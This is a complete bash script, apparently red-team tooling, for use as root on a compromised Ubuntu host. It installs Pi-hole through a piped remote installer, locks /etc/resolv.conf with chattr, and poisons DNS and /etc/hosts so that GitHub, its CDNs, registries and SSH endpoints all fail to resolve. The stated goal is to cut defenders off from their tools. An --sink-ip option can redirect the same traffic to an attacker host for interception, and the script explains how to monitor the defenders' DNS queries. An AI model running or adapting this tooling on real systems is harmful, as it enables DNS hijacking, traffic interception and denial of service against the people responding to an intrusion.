#!/usr/bin/env bash
# =============================================================================
# pihole-github-sinkhole.sh — Install Pi-hole and sinkhole all GitHub-related
# domains on a compromised Ubuntu 24.04 host.
#
# Effect: any process on the box (apt, curl, wget, git, pip, npm, etc.) that
# tries to reach GitHub will get NXDOMAIN or a dead IP instead.
# This cuts off blue team's ability to pull tools, run apt, or clone repos
# that resolve through GitHub infrastructure.
#
# Usage (on compromised host, as root):
#   sudo ./pihole-github-sinkhole.sh install   [--sink-ip <ip>]
#   sudo ./pihole-github-sinkhole.sh remove
#   sudo ./pihole-github-sinkhole.sh status
#   sudo ./pihole-github-sinkhole.sh test
#
# --sink-ip  IP to return for all GitHub domains (default: 0.0.0.0 = NXDOMAIN-ish)
#            Use your own LHOST to log/intercept GitHub traffic instead.
# =============================================================================

set -euo pipefail

# --------------------------------------------------------------------------- #
# Config
# --------------------------------------------------------------------------- #
SINK_IP="0.0.0.0"
PIHOLE_DIR="/etc/pihole"
CUSTOM_LIST="${PIHOLE_DIR}/custom.list"       # Pi-hole local DNS records
ADLISTS_DB="${PIHOLE_DIR}/adlists.list"
GITHUB_BLOCKLIST="/etc/pihole/github-sinkhole.txt"
HOSTS_MARKER="# === github-sinkhole ==="
LOG_FILE="/var/log/pihole-github-sinkhole.log"

# All GitHub-controlled hostnames / wildcard bases
# Pi-hole blocks entire domains (including all subdomains) when added to gravity
GITHUB_DOMAINS=(
    # Core product
    github.com
    # GitHub Pages / user content
    github.io
    github.dev
    # Raw file hosting & avatars
    githubusercontent.com
    # Static assets (JS/CSS CDN)
    githubassets.com
    # GitHub Copilot
    githubcopilot.com
    # Status page
    githubstatus.com
    # Container registry
    ghcr.io
    # Package registries
    pkg.github.com
    # GitHub Enterprise cloud
    ghe.com
    # OAuth / API subdomains handled by github.com wildcard,
    # but list explicitly for /etc/hosts layer
    api.github.com
    raw.githubusercontent.com
    camo.githubusercontent.com
    avatars.githubusercontent.com
    objects.githubusercontent.com
    media.githubusercontent.com
    cloud.githubusercontent.com
    user-images.githubusercontent.com
    private-user-images.githubusercontent.com
    # Actions / Codespaces
    actions-results-receiver-production.githubapp.com
    productionresultssa0.blob.core.windows.net
    # Git SSH (blocks git@ clone over SSH by breaking DNS)
    ssh.github.com
)

# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*" | tee -a "$LOG_FILE"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*" | tee -a "$LOG_FILE"; }
error() { echo -e "${RED}[-]${NC} $*" >&2 | tee -a "$LOG_FILE"; }
die()   { error "$*"; exit 1; }
hdr()   { echo -e "\n${CYAN}── $* ──${NC}"; }

require_root() { [[ $EUID -eq 0 ]] || die "Run as root: sudo $0 $*"; }

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --sink-ip) SINK_IP="$2"; shift 2 ;;
            *) shift ;;
        esac
    done
}

# --------------------------------------------------------------------------- #
# install
# --------------------------------------------------------------------------- #
cmd_install() {
    require_root
    mkdir -p "$(dirname "$LOG_FILE")"
    touch "$LOG_FILE"

    hdr "Pi-hole GitHub Sinkhole Installer"
    info "Sink IP  : ${SINK_IP}  (0.0.0.0 = hard-drop)"
    info "Log      : ${LOG_FILE}"
    echo

    # ── 1. Free port 53 (systemd-resolved conflict) ───────────────────────────
    hdr "1/6  Freeing port 53"
    if systemctl is-active --quiet systemd-resolved 2>/dev/null; then
        warn "Disabling systemd-resolved stub listener..."
        mkdir -p /etc/systemd/resolved.conf.d
        cat > /etc/systemd/resolved.conf.d/no-stub.conf <<'EOF'
[Resolve]
DNSStubListener=no
DNS=8.8.8.8
FallbackDNS=1.1.1.1
EOF
        systemctl restart systemd-resolved
        # Unlink the managed symlink and write a real file
        rm -f /etc/resolv.conf
        echo "nameserver 127.0.0.1" > /etc/resolv.conf
        chattr +i /etc/resolv.conf 2>/dev/null || true   # lock it so NetworkManager can't overwrite
        info "resolv.conf locked to 127.0.0.1"
    else
        info "systemd-resolved not active — port 53 should be free"
    fi

    # ── 2. Install Pi-hole unattended ─────────────────────────────────────────
    hdr "2/6  Installing Pi-hole"
    if command -v pihole &>/dev/null; then
        info "Pi-hole already installed: $(pihole version 2>/dev/null | head -1)"
    else
        info "Downloading Pi-hole installer..."
        # Write a pre-seed config so the installer runs fully unattended
        mkdir -p /etc/pihole
        cat > /etc/pihole/setupVars.conf <<EOF
PIHOLE_INTERFACE=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $5; exit}')
IPV4_ADDRESS=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{print $7; exit}')/$(ip -o -f inet addr show | awk '/scope global/{split($4,a,"/"); print a[2]; exit}')
IPV6_ADDRESS=
PIHOLE_DNS_1=8.8.8.8
PIHOLE_DNS_2=1.1.1.1
QUERY_LOGGING=true
INSTALL_WEB_SERVER=false
INSTALL_WEB_INTERFACE=false
LIGHTTPD_ENABLED=false
CACHE_SIZE=10000
DNS_FQDN_REQUIRED=false
DNS_BOGUS_PRIV=true
DNSMASQ_LISTENING=local
BLOCKING_ENABLED=true
EOF
        # Run installer non-interactively
        curl -sSL https://install.pi-hole.net | bash /dev/stdin --unattended \
            || die "Pi-hole installation failed — check network or try manually"
        info "Pi-hole installed"
    fi

    # ── 3. Build GitHub blocklist for Pi-hole gravity ─────────────────────────
    hdr "3/6  Building GitHub domain blocklist"
    : > "$GITHUB_BLOCKLIST"
    for DOMAIN in "${GITHUB_DOMAINS[@]}"; do
        echo "$DOMAIN" >> "$GITHUB_BLOCKLIST"
    done
    info "Wrote ${#GITHUB_DOMAINS[@]} domains to ${GITHUB_BLOCKLIST}"

    # Add the local blocklist as a Pi-hole adlist (file:// URI)
    ADLISTS_DB_SQLITE="${PIHOLE_DIR}/gravity.db"
    if [[ -f "$ADLISTS_DB_SQLITE" ]]; then
        # Pi-hole v5+ uses a SQLite gravity database
        sqlite3 "$ADLISTS_DB_SQLITE" \
            "INSERT OR IGNORE INTO adlist (address, enabled, comment)
             VALUES ('file://${GITHUB_BLOCKLIST}', 1, 'GitHub sinkhole — red team');" \
            2>/dev/null && info "Adlist registered in gravity.db" \
            || warn "sqlite3 insert failed — will add via pihole command"
    fi

    # Also add via pihole command as fallback
    pihole -a adlist add "file://${GITHUB_BLOCKLIST}" 2>/dev/null || true

    # ── 4. Run gravity update to pull blocklist into Pi-hole ──────────────────
    hdr "4/6  Updating Pi-hole gravity"
    pihole -g --skip-download 2>/dev/null \
        || pihole updateGravity 2>/dev/null \
        || warn "gravity update had errors (may still work)"
    info "Gravity updated"

    # ── 5. Add explicit custom DNS records (returns SINK_IP for each domain) ──
    hdr "5/6  Writing custom.list DNS records"
    # Pi-hole gravity returns NXDOMAIN; custom.list returns our chosen SINK_IP.
    # Both together mean: blocked domains resolve to SINK_IP (or 0.0.0.0).
    touch "$CUSTOM_LIST"
    for DOMAIN in "${GITHUB_DOMAINS[@]}"; do
        # Remove any existing entry for this domain first
        sed -i "/ ${DOMAIN}$/d" "$CUSTOM_LIST" 2>/dev/null || true
        echo "${SINK_IP} ${DOMAIN}" >> "$CUSTOM_LIST"
    done
    info "Wrote ${#GITHUB_DOMAINS[@]} records to ${CUSTOM_LIST}"

    # Restart Pi-hole FTL to pick up custom.list changes
    pihole restartdns 2>/dev/null || systemctl restart pihole-FTL 2>/dev/null || true

    # ── 6. Belt-and-suspenders: poison /etc/hosts directly ────────────────────
    hdr "6/6  Poisoning /etc/hosts"
    # Strip any previous sinkhole block
    _hosts_remove
    # Append new block
    {
        echo ""
        echo "$HOSTS_MARKER"
        for DOMAIN in "${GITHUB_DOMAINS[@]}"; do
            echo "${SINK_IP}  ${DOMAIN}  www.${DOMAIN}"
        done
        echo "# === end github-sinkhole ==="
    } >> /etc/hosts
    info "Poisoned /etc/hosts with ${#GITHUB_DOMAINS[@]} entries"

    # ── Verify ────────────────────────────────────────────────────────────────
    echo
    cmd_test

    echo
    info "=== Sinkhole ACTIVE ==="
    info "GitHub domains now resolve to: ${SINK_IP}"
    info "git clone, apt (GitHub CDN), pip install from GitHub, curl github.com — all dead"
    echo
    warn "To monitor blue team DNS queries hitting the sinkhole:"
    echo "    pihole -t               # live tail of all blocked queries"
    echo "    pihole -c               # chronometer / stats"
    echo "    tail -f /var/log/pihole.log | grep -E 'github|ghcr|githubassets'"
}

# --------------------------------------------------------------------------- #
# _hosts_remove — strip our block from /etc/hosts (internal helper)
# --------------------------------------------------------------------------- #
_hosts_remove() {
    if grep -q "$HOSTS_MARKER" /etc/hosts 2>/dev/null; then
        # Remove everything between our markers (inclusive)
        sed -i "/${HOSTS_MARKER}/,/# === end github-sinkhole ===/d" /etc/hosts
        info "Removed /etc/hosts sinkhole block"
    fi
}

# --------------------------------------------------------------------------- #
# remove
# --------------------------------------------------------------------------- #
cmd_remove() {
    require_root

    hdr "Removing GitHub sinkhole"

    # 1. Remove /etc/hosts block
    _hosts_remove

    # 2. Remove Pi-hole custom.list entries
    if [[ -f "$CUSTOM_LIST" ]]; then
        for DOMAIN in "${GITHUB_DOMAINS[@]}"; do
            sed -i "/ ${DOMAIN}$/d" "$CUSTOM_LIST" 2>/dev/null || true
        done
        info "Cleaned custom.list"
    fi

    # 3. Remove blocklist file
    rm -f "$GITHUB_BLOCKLIST"

    # 4. Remove from gravity DB
    if [[ -f "${PIHOLE_DIR}/gravity.db" ]]; then
        sqlite3 "${PIHOLE_DIR}/gravity.db" \
            "DELETE FROM adlist WHERE address='file://${GITHUB_BLOCKLIST}';" 2>/dev/null || true
    fi

    # 5. Re-run gravity to clear blocked entries
    pihole -g --skip-download 2>/dev/null || true

    # 6. Restore resolv.conf (unpin if we pinned it)
    chattr -i /etc/resolv.conf 2>/dev/null || true
    if [[ -f /etc/systemd/resolved.conf.d/no-stub.conf ]]; then
        rm -f /etc/systemd/resolved.conf.d/no-stub.conf
        systemctl restart systemd-resolved
        # Restore symlink
        ln -sf /run/systemd/resolve/stub-resolv.conf /etc/resolv.conf
        info "Restored systemd-resolved and resolv.conf symlink"
    fi

    pihole restartdns 2>/dev/null || true
    info "Sinkhole removed — GitHub domains resolve normally again"
}

# --------------------------------------------------------------------------- #
# status
# --------------------------------------------------------------------------- #
cmd_status() {
    hdr "Pi-hole service"
    systemctl status pihole-FTL --no-pager -l 2>/dev/null || \
        systemctl status pihole  --no-pager -l 2>/dev/null || \
        warn "pihole-FTL not found"

    hdr "Domains in custom.list"
    grep -c "github\|ghcr\|githubassets" "$CUSTOM_LIST" 2>/dev/null \
        && echo "  $(grep -c "." "$CUSTOM_LIST" 2>/dev/null) total records" \
        || warn "custom.list not found"

    hdr "/etc/hosts block"
    grep -A2 "$HOSTS_MARKER" /etc/hosts 2>/dev/null | head -5 || warn "Not found"

    hdr "Recent blocked GitHub queries (pihole log)"
    pihole -t 2>/dev/null &
    PIHOLE_PID=$!
    sleep 3
    kill $PIHOLE_PID 2>/dev/null || true
}

# --------------------------------------------------------------------------- #
# test — confirm domains are sunk
# --------------------------------------------------------------------------- #
cmd_test() {
    hdr "Resolution test (should all → ${SINK_IP} or NXDOMAIN)"
    local PASS=0 FAIL=0
    local TEST_HOSTS=(
        "github.com"
        "raw.githubusercontent.com"
        "api.github.com"
        "camo.githubusercontent.com"
        "github.io"
        "ghcr.io"
        "githubassets.com"
        "pkg.github.com"
    )
    for HOST in "${TEST_HOSTS[@]}"; do
        # Try system resolver (/etc/hosts wins first, then DNS)
        RESULT=$(getent hosts "$HOST" 2>/dev/null | awk '{print $1}' | head -1)
        if [[ -z "$RESULT" ]]; then
            # NXDOMAIN — also good
            echo -e "  ${GREEN}✔${NC}  ${HOST} → NXDOMAIN"
            ((PASS++))
        elif [[ "$RESULT" == "$SINK_IP" || "$RESULT" == "0.0.0.0" ]]; then
            echo -e "  ${GREEN}✔${NC}  ${HOST} → ${RESULT}"
            ((PASS++))
        else
            echo -e "  ${RED}✘${NC}  ${HOST} → ${RESULT}  ← NOT sunk!"
            ((FAIL++))
        fi
    done
    echo
    info "Results: ${PASS} sunk, ${FAIL} escaped"
    [[ $FAIL -eq 0 ]] && info "All test hosts sunk — GitHub is dead on this box" \
                      || warn "Some hosts escaped — check Pi-hole gravity and /etc/hosts"
}

# --------------------------------------------------------------------------- #
# Entry point
# --------------------------------------------------------------------------- #
CMD="${1:-help}"
shift || true
parse_args "$@"

case "$CMD" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    test)    cmd_test    ;;
    *)
        echo "Usage: sudo $0 {install|remove|status|test} [--sink-ip <ip>]"
        echo
        echo "  install   Install Pi-hole and sinkhole all GitHub domains"
        echo "  remove    Undo all changes and restore normal DNS"
        echo "  status    Show Pi-hole state and sinkhole coverage"
        echo "  test      Verify GitHub domains are dead"
        echo
        echo "  --sink-ip <ip>   IP to return (default: 0.0.0.0, use LHOST to intercept)"
        echo
        echo "Domains sunk: github.com, github.io, githubusercontent.com,"
        echo "              githubassets.com, ghcr.io, githubcopilot.com,"
        echo "              pkg.github.com, ghe.com, and all subdomains."
        ;;
esac
